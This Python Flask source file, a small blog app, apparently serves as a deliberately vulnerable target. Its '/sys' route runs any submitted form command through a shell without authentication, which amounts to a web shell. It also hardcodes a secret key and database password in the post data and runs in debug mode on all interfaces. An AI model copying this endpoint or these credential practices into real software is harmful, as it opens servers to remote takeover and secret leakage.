from flask import Flask, render_template, request
import subprocess

app = Flask(__name__)

# Sample data for blog posts
posts = [
    {
        'id': 1,
        'title': 'First Blog Post',
        'content': 'This is the content of the first blog post.',
        'author': 'Akshay Ravi',
        'date': '2024-08-30',
        'secretkey':'EMNBVCXZAWEDHYTFHJMNHG',
        'ip': '192.168.10.11',
        'dbpassword':'ak$h@yh3r3'
    }
]

@app.route('/')
def index():
    return render_template('index.html', posts=posts)

@app.route('/post/<int:post_id>')
def post(post_id):
    post = next((p for p in posts if p['id'] == post_id), None)
    return render_template('post.html', post=post)

@app.route('/sys', methods=['GET', 'POST'])
def sys_command():
    output = ""
    if request.method == 'POST':
        command = request.form.get('command')
        try:
            result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            output = result.stdout + result.stderr
        except subprocess.CalledProcessError as e:
            output = e.output + e.stderr
    return render_template('sys.html', output=output)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1336, debug=True)
